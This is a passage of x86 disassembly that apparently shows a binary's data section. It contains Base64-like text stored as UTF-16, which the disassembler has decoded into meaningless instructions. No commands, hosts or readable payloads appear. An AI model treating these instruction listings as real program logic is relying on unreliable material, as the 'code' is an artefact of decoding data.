  40aba7:	00 7a 00             	add    %bh,0x0(%edx)
  40abaa:	74 00                	je     0x40abac
  40abac:	71 00                	jno    0x40abae
  40abae:	33 00                	xor    (%eax),%eax
  40abb0:	76 00                	jbe    0x40abb2
  40abb2:	78 00                	js     0x40abb4
  40abb4:	35 00 50 00 76       	xor    $0x76005000,%eax
  40abb9:	00 62 00             	add    %ah,0x0(%edx)
  40abbc:	4c                   	dec    %esp
  40abbd:	00 47 00             	add    %al,0x0(%edi)
  40abc0:	6e                   	outsb  %ds:(%esi),(%dx)
  40abc1:	00 56 00             	add    %dl,0x0(%esi)
  40abc4:	53                   	push   %ebx
  40abc5:	00 76 00             	add    %dh,0x0(%esi)
  40abc8:	65 00 35 00 4c 00 66 	add    %dh,%gs:0x66004c00
  40abcf:	00 5a 00             	add    %bl,0x0(%edx)
  40abd2:	41                   	inc    %ecx
  40abd3:	00 38                	add    %bh,(%eax)
  40abd5:	00 6b 00             	add    %ch,0x0(%ebx)
  40abd8:	59                   	pop    %ecx
  40abd9:	00 71 00             	add    %dh,0x0(%ecx)
  40abdc:	6e                   	outsb  %ds:(%esi),(%dx)
  40abdd:	00 77 00             	add    %dh,0x0(%edi)
  40abe0:	6c                   	insb   (%dx),%es:(%edi)
  40abe1:	00 50 00             	add    %dl,0x0(%eax)
  40abe4:	48                   	dec    %eax
  40abe5:	00 37                	add    %dh,(%edi)
  40abe7:	00 61 00             	add    %ah,0x0(%ecx)
  40abea:	55                   	push   %ebp
  40abeb:	00 79 00             	add    %bh,0x0(%ecx)
  40abee:	77 00                	ja     0x40abf0
  40abf0:	48                   	dec    %eax
  40abf1:	00 75 00             	add    %dh,0x0(%ebp)
  40abf4:	36 00 71 00          	add    %dh,%ss:0x0(%ecx)
  40abf8:	5a                   	pop    %edx
  40abf9:	00 46 00             	add    %al,0x0(%esi)
  40abfc:	56                   	push   %esi
  40abfd:	00 57 00             	add    %dl,0x0(%edi)
  40ac00:	4f                   	dec    %edi
  40ac01:	00 35 00 61 00 67    	add    %dh,0x67006100
  40ac07:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac0a:	49                   	dec    %ecx
  40ac0b:	00 50 00             	add    %dl,0x0(%eax)
  40ac0e:	35 00 45 00 61       	xor    $0x61004500,%eax
  40ac13:	00 70 00             	add    %dh,0x0(%eax)
  40ac16:	68 00 38 00 74       	push   $0x74003800
  40ac1b:	00 7a 00             	add    %bh,0x0(%edx)
  40ac1e:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac1f:	00 49 00             	add    %cl,0x0(%ecx)
  40ac22:	4c                   	dec    %esp
  40ac23:	00 48 00             	add    %cl,0x0(%eax)
  40ac26:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac27:	00 4e 00             	add    %cl,0x0(%esi)
  40ac2a:	4f                   	dec    %edi
  40ac2b:	00 77 00             	add    %dh,0x0(%edi)
  40ac2e:	44                   	inc    %esp
  40ac2f:	00 4c 00 31          	add    %cl,0x31(%eax,%eax,1)
  40ac33:	00 39                	add    %bh,(%ecx)
  40ac35:	00 46 00             	add    %al,0x0(%esi)
  40ac38:	4f                   	dec    %edi
  40ac39:	00 70 00             	add    %dh,0x0(%eax)
  40ac3c:	31 00                	xor    %eax,(%eax)
  40ac3e:	43                   	inc    %ebx
  40ac3f:	00 4e 00             	add    %cl,0x0(%esi)
  40ac42:	44                   	inc    %esp
  40ac43:	00 78 00             	add    %bh,0x0(%eax)
  40ac46:	78 00                	js     0x40ac48
  40ac48:	59                   	pop    %ecx
  40ac49:	00 71 00             	add    %dh,0x0(%ecx)
  40ac4c:	57                   	push   %edi
  40ac4d:	00 4a 00             	add    %cl,0x0(%edx)
  40ac50:	37                   	aaa
  40ac51:	00 75 00             	add    %dh,0x0(%ebp)
  40ac54:	6a 00                	push   $0x0
  40ac56:	4b                   	dec    %ebx
  40ac57:	00 56 00             	add    %dl,0x0(%esi)
  40ac5a:	54                   	push   %esp
  40ac5b:	00 54 00 7a          	add    %dl,0x7a(%eax,%eax,1)
  40ac5f:	00 53 00             	add    %dl,0x0(%ebx)
  40ac62:	41                   	inc    %ecx
  40ac63:	00 78 00             	add    %bh,0x0(%eax)
  40ac66:	6a 00                	push   $0x0
  40ac68:	58                   	pop    %eax
  40ac69:	00 51 00             	add    %dl,0x0(%ecx)
  40ac6c:	77 00                	ja     0x40ac6e
  40ac6e:	75 00                	jne    0x40ac70
  40ac70:	65 00 36             	add    %dh,%gs:(%esi)
  40ac73:	00 47 00             	add    %al,0x0(%edi)
  40ac76:	64 00 58 00          	add    %bl,%fs:0x0(%eax)
  40ac7a:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  40ac7e:	51                   	push   %ecx
  40ac7f:	00 66 00             	add    %ah,0x0(%esi)
  40ac82:	69 00 44 00 56 00    	imul   $0x560044,(%eax),%eax
  40ac88:	44                   	inc    %esp
  40ac89:	00 68 00             	add    %ch,0x0(%eax)
  40ac8c:	59                   	pop    %ecx
  40ac8d:	00 31                	add    %dh,(%ecx)
  40ac8f:	00 4a 00             	add    %cl,0x0(%edx)
  40ac92:	44                   	inc    %esp
  40ac93:	00 54 00 38          	add    %dl,0x38(%eax,%eax,1)
  40ac97:	00 76 00             	add    %dh,0x0(%esi)
  40ac9a:	43                   	inc    %ebx
  40ac9b:	00 39                	add    %bh,(%ecx)
  40ac9d:	00 78 00             	add    %bh,0x0(%eax)
  40aca0:	36 00 6b 00          	add    %ch,%ss:0x0(%ebx)
  40aca4:	31 00                	xor    %eax,(%eax)
  40aca6:	30 00                	xor    %al,(%eax)
  40aca8:	4d                   	dec    %ebp
  40aca9:	00 49 00             	add    %cl,0x0(%ecx)
  40acac:	51                   	push   %ecx
  40acad:	00 71 00             	add    %dh,0x0(%ecx)
  40acb0:	61                   	popa
  40acb1:	00 7a 00             	add    %bh,0x0(%edx)
  40acb4:	34 00                	xor    $0x0,%al
  40acb6:	2f                   	das
  40acb7:	00 51 00             	add    %dl,0x0(%ecx)
  40acba:	6c                   	insb   (%dx),%es:(%edi)
  40acbb:	00 52 00             	add    %dl,0x0(%edx)
  40acbe:	42                   	inc    %edx
  40acbf:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
  40acc3:	00 6e 00             	add    %ch,0x0(%esi)
  40acc6:	68 00 4d 00 4d       	push   $0x4d004d00
  40accb:	00 36                	add    %dh,(%esi)
  40accd:	00 49 00             	add    %cl,0x0(%ecx)
  40acd0:	32 00                	xor    (%eax),%al
  40acd2:	41                   	inc    %ecx
  40acd3:	00 6f 00             	add    %ch,0x0(%edi)
  40acd6:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40acda:	31 00                	xor    %eax,(%eax)
  40acdc:	72 00                	jb     0x40acde
  40acde:	68 00 72 00 49       	push   $0x49007200
  40ace3:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ace6:	67 00 50 00          	add    %dl,0x0(%bx,%si)
  40acea:	38 00                	cmp    %al,(%eax)
  40acec:	50                   	push   %eax
  40aced:	00 6b 00             	add    %ch,0x0(%ebx)
  40acf0:	75 00                	jne    0x40acf2
  40acf2:	2b 00                	sub    (%eax),%eax
  40acf4:	4d                   	dec    %ebp
  40acf5:	00 30                	add    %dh,(%eax)
  40acf7:	00 42 00             	add    %al,0x0(%edx)
  40acfa:	72 00                	jb     0x40acfc
  40acfc:	77 00                	ja     0x40acfe
  40acfe:	30 00                	xor    %al,(%eax)
  40ad00:	41                   	inc    %ecx
  40ad01:	00 67 00             	add    %ah,0x0(%edi)
  40ad04:	62 00                	bound  %eax,(%eax)
  40ad06:	54                   	push   %esp
  40ad07:	00 69 00             	add    %ch,0x0(%ecx)
  40ad0a:	50                   	push   %eax
  40ad0b:	00 73 00             	add    %dh,0x0(%ebx)
  40ad0e:	61                   	popa
  40ad0f:	00 44 00 6d          	add    %al,0x6d(%eax,%eax,1)
  40ad13:	00 59 00             	add    %bl,0x0(%ecx)
  40ad16:	38 00                	cmp    %al,(%eax)
  40ad18:	77 00                	ja     0x40ad1a
  40ad1a:	3d 00 00 87 b1       	cmp    $0xb1870000,%eax
  40ad1f:	36 00 66 00          	add    %ah,%ss:0x0(%esi)
  40ad23:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad24:	00 61 00             	add    %ah,0x0(%ecx)
  40ad27:	35 00 34 00 5a       	xor    $0x5a003400,%eax
  40ad2c:	00 2b                	add    %ch,(%ebx)
  40ad2e:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad31:	72 00                	jb     0x40ad33
  40ad33:	69 00 63 00 50 00    	imul   $0x500063,(%eax),%eax
  40ad39:	61                   	popa
  40ad3a:	00 5a 00             	add    %bl,0x0(%edx)
  40ad3d:	6a 00                	push   $0x0
  40ad3f:	69 00 2b 00 36 00    	imul   $0x36002b,(%eax),%eax
  40ad45:	65 00 31             	add    %dh,%gs:(%ecx)
  40ad48:	00 56 00             	add    %dl,0x0(%esi)
  40ad4b:	4b                   	dec    %ebx
  40ad4c:	00 43 00             	add    %al,0x0(%ebx)
  40ad4f:	4c                   	dec    %esp
  40ad50:	00 7a 00             	add    %bh,0x0(%edx)
  40ad53:	63 00                	arpl   %eax,(%eax)
  40ad55:	71 00                	jno    0x40ad57
  40ad57:	4e                   	dec    %esi
  40ad58:	00 50 00             	add    %dl,0x0(%eax)
  40ad5b:	79 00                	jns    0x40ad5d
  40ad5d:	4f                   	dec    %edi
  40ad5e:	00 68 00             	add    %ch,0x0(%eax)
  40ad61:	75 00                	jne    0x40ad63
  40ad63:	34 00                	xor    $0x0,%al
  40ad65:	62 00                	bound  %eax,(%eax)
  40ad67:	2f                   	das
  40ad68:	00 49 00             	add    %cl,0x0(%ecx)
  40ad6b:	51                   	push   %ecx
  40ad6c:	00 52 00             	add    %dl,0x0(%edx)
  40ad6f:	38 00                	cmp    %al,(%eax)
  40ad71:	6c                   	insb   (%dx),%es:(%edi)
  40ad72:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  40ad76:	00 69 00             	add    %ch,0x0(%ecx)
  40ad79:	65 00 36             	add    %dh,%gs:(%esi)
  40ad7c:	00 30                	add    %dh,(%eax)
  40ad7e:	00 42 00             	add    %al,0x0(%edx)
  40ad81:	55                   	push   %ebp
  40ad82:	00 6e 00             	add    %ch,0x0(%esi)
  40ad85:	6c                   	insb   (%dx),%es:(%edi)
  40ad86:	00 35 00 30 00 74    	add    %dh,0x74003000
  40ad8c:	00 4d 00             	add    %cl,0x0(%ebp)
  40ad8f:	54                   	push   %esp
  40ad90:	00 66 00             	add    %ah,0x0(%esi)
  40ad93:	7a 00                	jp     0x40ad95
  40ad95:	59                   	pop    %ecx
  40ad96:	00 41 00             	add    %al,0x0(%ecx)
  40ad99:	4a                   	dec    %edx
  40ad9a:	00 62 00             	add    %ah,0x0(%edx)
  40ad9d:	4c                   	dec    %esp
  40ad9e:	00 2f                	add    %ch,(%edi)
  40ada0:	00 72 00             	add    %dh,0x0(%edx)
  40ada3:	65 00 44 00 69       	add    %al,%gs:0x69(%eax,%eax,1)
  40ada8:	00 6b 00             	add    %ch,0x0(%ebx)
  40adab:	68 00 37 00 49       	push   $0x49003700
  40adb0:	00 51 00             	add    %dl,0x0(%ecx)
  40adb3:	57                   	push   %edi
  40adb4:	00 7a 00             	add    %bh,0x0(%edx)
  40adb7:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  40adbb:	68 00 6e 00 30       	push   $0x30006e00
  40adc0:	00 65 00             	add    %ah,0x0(%ebp)
  40adc3:	49                   	dec    %ecx
  40adc4:	00 2f                	add    %ch,(%edi)
  40adc6:	00 71 00             	add    %dh,0x0(%ecx)
  40adc9:	53                   	push   %ebx
  40adca:	00 59 00             	add    %bl,0x0(%ecx)
  40adcd:	58                   	pop    %eax
  40adce:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
  40add2:	00 7a 00             	add    %bh,0x0(%edx)
  40add5:	45                   	inc    %ebp
  40add6:	00 72 00             	add    %dh,0x0(%edx)
  40add9:	4c                   	dec    %esp
  40adda:	00 34 00             	add    %dh,(%eax,%eax,1)
  40addd:	70 00                	jo     0x40addf
  40addf:	55                   	push   %ebp
  40ade0:	00 38                	add    %bh,(%eax)
  40ade2:	00 31                	add    %dh,(%ecx)
  40ade4:	00 64 00 78          	add    %ah,0x78(%eax,%eax,1)
  40ade8:	00 4f 00             	add    %cl,0x0(%edi)
  40adeb:	35 00 37 00 65       	xor    $0x65003700,%eax
  40adf0:	00 67 00             	add    %ah,0x0(%edi)
  40adf3:	45                   	inc    %ebp
  40adf4:	00 42 00             	add    %al,0x0(%edx)
  40adf7:	72 00                	jb     0x40adf9
  40adf9:	30 00                	xor    %al,(%eax)
  40adfb:	55                   	push   %ebp
  40adfc:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40ae00:	00 5a 00             	add    %bl,0x0(%edx)
  40ae03:	59                   	pop    %ecx
  40ae04:	00 65 00             	add    %ah,0x0(%ebp)
  40ae07:	73 00                	jae    0x40ae09
  40ae09:	4d                   	dec    %ebp
  40ae0a:	00 48 00             	add    %cl,0x0(%eax)
  40ae0d:	6c                   	insb   (%dx),%es:(%edi)
  40ae0e:	00 79 00             	add    %bh,0x0(%ecx)
  40ae11:	43                   	inc    %ebx
  40ae12:	00 77 00             	add    %dh,0x0(%edi)
  40ae15:	7a 00                	jp     0x40ae17
  40ae17:	6b 00 57             	imul   $0x57,(%eax),%eax
  40ae1a:	00 31                	add    %dh,(%ecx)
  40ae1c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ae1f:	50                   	push   %eax
  40ae20:	00 4c 00 4a          	add    %cl,0x4a(%eax,%eax,1)
  40ae24:	00 50 00             	add    %dl,0x0(%eax)
  40ae27:	63 00                	arpl   %eax,(%eax)
  40ae29:	66 00 47 00          	data16 add %al,0x0(%edi)
  40ae2d:	4d                   	dec    %ebp
  40ae2e:	00 33                	add    %dh,(%ebx)
  40ae30:	00 47 00             	add    %al,0x0(%edi)
  40ae33:	78 00                	js     0x40ae35
  40ae35:	63 00                	arpl   %eax,(%eax)
  40ae37:	51                   	push   %ecx
  40ae38:	00 78 00             	add    %bh,0x0(%eax)
  40ae3b:	58                   	pop    %eax
  40ae3c:	00 57 00             	add    %dl,0x0(%edi)
  40ae3f:	37                   	aaa
  40ae40:	00 32                	add    %dh,(%edx)
  40ae42:	00 30                	add    %dh,(%eax)
  40ae44:	00 6d 00             	add    %ch,0x0(%ebp)
  40ae47:	49                   	dec    %ecx
  40ae48:	00 73 00             	add    %dh,0x0(%ebx)
  40ae4b:	4f                   	dec    %edi
  40ae4c:	00 58 00             	add    %bl,0x0(%eax)
  40ae4f:	34 00                	xor    $0x0,%al
  40ae51:	68 00 6a 00 61       	push   $0x61006a00
  40ae56:	00 38                	add    %bh,(%eax)
  40ae58:	00 33                	add    %dh,(%ebx)
  40ae5a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ae5d:	6d                   	insl   (%dx),%es:(%edi)
  40ae5e:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
  40ae62:	00 41 00             	add    %al,0x0(%ecx)
  40ae65:	72 00                	jb     0x40ae67
  40ae67:	4e                   	dec    %esi
  40ae68:	00 78 00             	add    %bh,0x0(%eax)
  40ae6b:	5a                   	pop    %edx
  40ae6c:	00 75 00             	add    %dh,0x0(%ebp)
  40ae6f:	4b                   	dec    %ebx
  40ae70:	00 41 00             	add    %al,0x0(%ecx)
  40ae73:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae74:	00 41 00             	add    %al,0x0(%ecx)
  40ae77:	76 00                	jbe    0x40ae79
  40ae79:	4d                   	dec    %ebp
  40ae7a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ae7d:	4d                   	dec    %ebp
  40ae7e:	00 61 00             	add    %ah,0x0(%ecx)
  40ae81:	61                   	popa
  40ae82:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ae85:	36 00 33             	add    %dh,%ss:(%ebx)
  40ae88:	00 47 00             	add    %al,0x0(%edi)
  40ae8b:	2b 00                	sub    (%eax),%eax
  40ae8d:	6d                   	insl   (%dx),%es:(%edi)
  40ae8e:	00 4f 00             	add    %cl,0x0(%edi)
  40ae91:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
  40ae95:	74 00                	je     0x40ae97
  40ae97:	43                   	inc    %ebx
  40ae98:	00 32                	add    %dh,(%edx)
  40ae9a:	00 38                	add    %bh,(%eax)
  40ae9c:	00 66 00             	add    %ah,0x0(%esi)
  40ae9f:	4a                   	dec    %edx
  40aea0:	00 6a 00             	add    %ch,0x0(%edx)
  40aea3:	68 00 52 00 5a       	push   $0x5a005200
  40aea8:	00 30                	add    %dh,(%eax)
  40aeaa:	00 4a 00             	add    %cl,0x0(%edx)
  40aead:	77 00                	ja     0x40aeaf
  40aeaf:	2f                   	das
  40aeb0:	00 6b 00             	add    %ch,0x0(%ebx)
  40aeb3:	56                   	push   %esi
  40aeb4:	00 2f                	add    %ch,(%edi)
  40aeb6:	00 37                	add    %dh,(%edi)
  40aeb8:	00 51 00             	add    %dl,0x0(%ecx)
  40aebb:	62 00                	bound  %eax,(%eax)
  40aebd:	35 00 77 00 56       	xor    $0x56007700,%eax
  40aec2:	00 36                	add    %dh,(%esi)
  40aec4:	00 63 00             	add    %ah,0x0(%ebx)
  40aec7:	59                   	pop    %ecx
  40aec8:	00 37                	add    %dh,(%edi)
  40aeca:	00 4d 00             	add    %cl,0x0(%ebp)
  40aecd:	6b 00 64             	imul   $0x64,(%eax),%eax
  40aed0:	00 39                	add    %bh,(%ecx)
  40aed2:	00 33                	add    %dh,(%ebx)
  40aed4:	00 61 00             	add    %ah,0x0(%ecx)
  40aed7:	30 00                	xor    %al,(%eax)
  40aed9:	2f                   	das
  40aeda:	00 39                	add    %bh,(%ecx)
  40aedc:	00 38                	add    %bh,(%eax)
  40aede:	00 6c 00 7a          	add    %ch,0x7a(%eax,%eax,1)
  40aee2:	00 76 00             	add    %dh,0x0(%esi)
  40aee5:	79 00                	jns    0x40aee7
  40aee7:	63 00                	arpl   %eax,(%eax)
  40aee9:	35 00 2f 00 68       	xor    $0x68002f00,%eax
  40aeee:	00 49 00             	add    %cl,0x0(%ecx)
  40aef1:	51                   	push   %ecx
  40aef2:	00 56 00             	add    %dl,0x0(%esi)
  40aef5:	42                   	inc    %edx
  40aef6:	00 75 00             	add    %dh,0x0(%ebp)
  40aef9:	4e                   	dec    %esi
  40aefa:	00 41 00             	add    %al,0x0(%ecx)
  40aefd:	4c                   	dec    %esp
  40aefe:	00 56 00             	add    %dl,0x0(%esi)
  40af01:	72 00                	jb     0x40af03
  40af03:	71 00                	jno    0x40af05
  40af05:	63 00                	arpl   %eax,(%eax)
  40af07:	65 00 64 00 68       	add    %ah,%gs:0x68(%eax,%eax,1)
  40af0c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40af0f:	4d                   	dec    %ebp
  40af10:	00 2b                	add    %ch,(%ebx)
  40af12:	00 5a 00             	add    %bl,0x0(%edx)
  40af15:	54                   	push   %esp
  40af16:	00 4f 00             	add    %cl,0x0(%edi)
  40af19:	71 00                	jno    0x40af1b
  40af1b:	6a 00                	push   $0x0
  40af1d:	68 00 38 00 4d       	push   $0x4d003800
  40af22:	00 4a 00             	add    %cl,0x0(%edx)
  40af25:	68 00 63 00 4d       	push   $0x4d006300
  40af2a:	00 49 00             	add    %cl,0x0(%ecx)
  40af2d:	57                   	push   %edi
  40af2e:	00 38                	add    %bh,(%eax)
  40af30:	00 69 00             	add    %ch,0x0(%ecx)
  40af33:	51                   	push   %ecx
  40af34:	00 48 00             	add    %cl,0x0(%eax)
  40af37:	6d                   	insl   (%dx),%es:(%edi)
  40af38:	00 37                	add    %dh,(%edi)
  40af3a:	00 77 00             	add    %dh,0x0(%edi)
  40af3d:	7a 00                	jp     0x40af3f
  40af3f:	48                   	dec    %eax
  40af40:	00 56 00             	add    %dl,0x0(%esi)
  40af43:	62 00                	bound  %eax,(%eax)
  40af45:	69 00 62 00 61 00    	imul   $0x610062,(%eax),%eax
  40af4b:	6d                   	insl   (%dx),%es:(%edi)
  40af4c:	00 6b 00             	add    %ch,0x0(%ebx)
  40af4f:	34 00                	xor    $0x0,%al
  40af51:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  40af55:	76 00                	jbe    0x40af57
  40af57:	53                   	push   %ebx
  40af58:	00 52 00             	add    %dl,0x0(%edx)
  40af5b:	33 00                	xor    (%eax),%eax
  40af5d:	77 00                	ja     0x40af5f
  40af5f:	43                   	inc    %ebx
  40af60:	00 49 00             	add    %cl,0x0(%ecx)
  40af63:	57                   	push   %edi
  40af64:	00 2f                	add    %ch,(%edi)
  40af66:	00 4a 00             	add    %cl,0x0(%edx)
  40af69:	6c                   	insb   (%dx),%es:(%edi)
  40af6a:	00 2f                	add    %ch,(%edi)
  40af6c:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
  40af70:	00 72 00             	add    %dh,0x0(%edx)
  40af73:	68 00 46 00 37       	push   $0x37004600
  40af78:	00 69 00             	add    %ch,0x0(%ecx)
  40af7b:	4b                   	dec    %ebx
  40af7c:	00 65 00             	add    %ah,0x0(%ebp)
  40af7f:	75 00                	jne    0x40af81
  40af81:	58                   	pop    %eax
  40af82:	00 52 00             	add    %dl,0x0(%edx)
  40af85:	79 00                	jns    0x40af87
  40af87:	6d                   	insl   (%dx),%es:(%edi)
  40af88:	00 55 00             	add    %dl,0x0(%ebp)
  40af8b:	44                   	inc    %esp
  40af8c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40af8f:	33 00                	xor    (%eax),%eax
  40af91:	55                   	push   %ebp
  40af92:	00 44 00 76          	add    %al,0x76(%eax,%eax,1)
  40af96:	00 4b 00             	add    %cl,0x0(%ebx)
  40af99:	49                   	dec    %ecx
  40af9a:	00 44 00 75          	add    %al,0x75(%eax,%eax,1)
  40af9e:	00 65 00             	add    %ah,0x0(%ebp)
  40afa1:	46                   	inc    %esi
  40afa2:	00 45 00             	add    %al,0x0(%ebp)
  40afa5:	73 00                	jae    0x40afa7
  40afa7:	51                   	push   %ecx
  40afa8:	00 46 00             	add    %al,0x0(%esi)
  40afab:	59                   	pop    %ecx
  40afac:	00 52 00             	add    %dl,0x0(%edx)
  40afaf:	4d                   	dec    %ebp
  40afb0:	00 38                	add    %bh,(%eax)
  40afb2:	00 71 00             	add    %dh,0x0(%ecx)
  40afb5:	4f                   	dec    %edi
  40afb6:	00 33                	add    %dh,(%ebx)
  40afb8:	00 2f                	add    %ch,(%edi)
  40afba:	00 6e 00             	add    %ch,0x0(%esi)
  40afbd:	6a 00                	push   $0x0
  40afbf:	78 00                	js     0x40afc1
  40afc1:	76 00                	jbe    0x40afc3
  40afc3:	69 00 31 00 43 00    	imul   $0x430031,(%eax),%eax
  40afc9:	75 00                	jne    0x40afcb
  40afcb:	77 00                	ja     0x40afcd
  40afcd:	55                   	push   %ebp
  40afce:	00 78 00             	add    %bh,0x0(%eax)
  40afd1:	66 00 55 00          	data16 add %dl,0x0(%ebp)
  40afd5:	53                   	push   %ebx
  40afd6:	00 35 00 44 00 62    	add    %dh,0x62004400
  40afdc:	00 6f 00             	add    %ch,0x0(%edi)
  40afdf:	79 00                	jns    0x40afe1
  40afe1:	54                   	push   %esp
  40afe2:	00 34 00             	add    %dh,(%eax,%eax,1)
  40afe5:	43                   	inc    %ebx
  40afe6:	00 78 00             	add    %bh,0x0(%eax)
  40afe9:	36 00 62 00          	add    %ah,%ss:0x0(%edx)
  40afed:	50                   	push   %eax
  40afee:	00 64 00 44          	add    %ah,0x44(%eax,%eax,1)
  40aff2:	00 52 00             	add    %dl,0x0(%edx)
  40aff5:	71 00                	jno    0x40aff7
  40aff7:	73 00                	jae    0x40aff9
  40aff9:	69 00 4e 00 73 00    	imul   $0x73004e,(%eax),%eax
  40afff:	33 00                	xor    (%eax),%eax
  40b001:	6b 00 30             	imul   $0x30,(%eax),%eax
  40b004:	00 53 00             	add    %dl,0x0(%ebx)
  40b007:	37                   	aaa
  40b008:	00 47 00             	add    %al,0x0(%edi)
  40b00b:	73 00                	jae    0x40b00d
  40b00d:	55                   	push   %ebp
  40b00e:	00 76 00             	add    %dh,0x0(%esi)
  40b011:	58                   	pop    %eax
  40b012:	00 57 00             	add    %dl,0x0(%edi)
  40b015:	48                   	dec    %eax
  40b016:	00 55 00             	add    %dl,0x0(%ebp)
  40b019:	46                   	inc    %esi
  40b01a:	00 2f                	add    %ch,(%edi)
  40b01c:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
  40b020:	00 77 00             	add    %dh,0x0(%edi)
  40b023:	78 00                	js     0x40b025
  40b025:	53                   	push   %ebx
  40b026:	00 61 00             	add    %ah,0x0(%ecx)
  40b029:	6c                   	insb   (%dx),%es:(%edi)
  40b02a:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40b02e:	00 4f 00             	add    %cl,0x0(%edi)
  40b031:	34 00                	xor    $0x0,%al
  40b033:	75 00                	jne    0x40b035
  40b035:	33 00                	xor    (%eax),%eax
  40b037:	44                   	inc    %esp
  40b038:	00 4b 00             	add    %cl,0x0(%ebx)
  40b03b:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40b03f:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40b043:	76 00                	jbe    0x40b045
  40b045:	54                   	push   %esp
  40b046:	00 49 00             	add    %cl,0x0(%ecx)
  40b049:	7a 00                	jp     0x40b04b
  40b04b:	47                   	inc    %edi
  40b04c:	00 6b 00             	add    %ch,0x0(%ebx)
  40b04f:	70 00                	jo     0x40b051
  40b051:	73 00                	jae    0x40b053
  40b053:	6d                   	insl   (%dx),%es:(%edi)
  40b054:	00 46 00             	add    %al,0x0(%esi)
  40b057:	50                   	push   %eax
  40b058:	00 4e 00             	add    %cl,0x0(%esi)
  40b05b:	4b                   	dec    %ebx
  40b05c:	00 2b                	add    %ch,(%ebx)
  40b05e:	00 4b 00             	add    %cl,0x0(%ebx)
  40b061:	78 00                	js     0x40b063
  40b063:	74 00                	je     0x40b065
  40b065:	4a                   	dec    %edx
  40b066:	00 4d 00             	add    %cl,0x0(%ebp)
  40b069:	48                   	dec    %eax
  40b06a:	00 39                	add    %bh,(%ecx)
  40b06c:	00 72 00             	add    %dh,0x0(%edx)
  40b06f:	47                   	inc    %edi
  40b070:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b073:	31 00                	xor    %eax,(%eax)
  40b075:	4a                   	dec    %edx
  40b076:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
  40b07a:	00 64 00 30          	add    %ah,0x30(%eax,%eax,1)
  40b07e:	00 77 00             	add    %dh,0x0(%edi)
  40b081:	4f                   	dec    %edi
  40b082:	00 59 00             	add    %bl,0x0(%ecx)
  40b085:	43                   	inc    %ebx
  40b086:	00 63 00             	add    %ah,0x0(%ebx)
  40b089:	53                   	push   %ebx
  40b08a:	00 2f                	add    %ch,(%edi)
  40b08c:	00 6b 00             	add    %ch,0x0(%ebx)
  40b08f:	75 00                	jne    0x40b091
  40b091:	62 00                	bound  %eax,(%eax)
  40b093:	4f                   	dec    %edi
  40b094:	00 70 00             	add    %dh,0x0(%eax)
  40b097:	74 00                	je     0x40b099
  40b099:	59                   	pop    %ecx
  40b09a:	00 66 00             	add    %ah,0x0(%esi)
  40b09d:	48                   	dec    %eax
  40b09e:	00 71 00             	add    %dh,0x0(%ecx)
  40b0a1:	44                   	inc    %esp
  40b0a2:	00 50 00             	add    %dl,0x0(%eax)
  40b0a5:	4e                   	dec    %esi
  40b0a6:	00 48 00             	add    %cl,0x0(%eax)
  40b0a9:	49                   	dec    %ecx
  40b0aa:	00 53 00             	add    %dl,0x0(%ebx)
  40b0ad:	74 00                	je     0x40b0af
  40b0af:	2b 00                	sub    (%eax),%eax
  40b0b1:	49                   	dec    %ecx
  40b0b2:	00 7a 00             	add    %bh,0x0(%edx)
  40b0b5:	72 00                	jb     0x40b0b7
  40b0b7:	61                   	popa
  40b0b8:	00 2b                	add    %ch,(%ebx)
  40b0ba:	00 4c 00 5a          	add    %cl,0x5a(%eax,%eax,1)
  40b0be:	00 78 00             	add    %bh,0x0(%eax)
  40b0c1:	46                   	inc    %esi
  40b0c2:	00 32                	add    %dh,(%edx)
  40b0c4:	00 73 00             	add    %dh,0x0(%ebx)
  40b0c7:	62 00                	bound  %eax,(%eax)
  40b0c9:	37                   	aaa
  40b0ca:	00 68 00             	add    %ch,0x0(%eax)
  40b0cd:	7a 00                	jp     0x40b0cf
  40b0cf:	35 00 2b 00 50       	xor    $0x50002b00,%eax
  40b0d4:	00 62 00             	add    %ah,0x0(%edx)
  40b0d7:	78 00                	js     0x40b0d9
  40b0d9:	78 00                	js     0x40b0db
  40b0db:	2b 00                	sub    (%eax),%eax
  40b0dd:	7a 00                	jp     0x40b0df
  40b0df:	72 00                	jb     0x40b0e1
  40b0e1:	55                   	push   %ebp
  40b0e2:	00 5a 00             	add    %bl,0x0(%edx)
  40b0e5:	31 00                	xor    %eax,(%eax)
  40b0e7:	6b 00 49             	imul   $0x49,(%eax),%eax
  40b0ea:	00 71 00             	add    %dh,0x0(%ecx)
  40b0ed:	33 00                	xor    (%eax),%eax
  40b0ef:	77 00                	ja     0x40b0f1
  40b0f1:	62 00                	bound  %eax,(%eax)
  40b0f3:	67 00 45 00          	add    %al,0x0(%di)
  40b0f7:	53                   	push   %ebx
  40b0f8:	00 2b                	add    %ch,(%ebx)
  40b0fa:	00 65 00             	add    %ah,0x0(%ebp)
  40b0fd:	6b 00 56             	imul   $0x56,(%eax),%eax
  40b100:	00 55 00             	add    %dl,0x0(%ebp)
  40b103:	44                   	inc    %esp
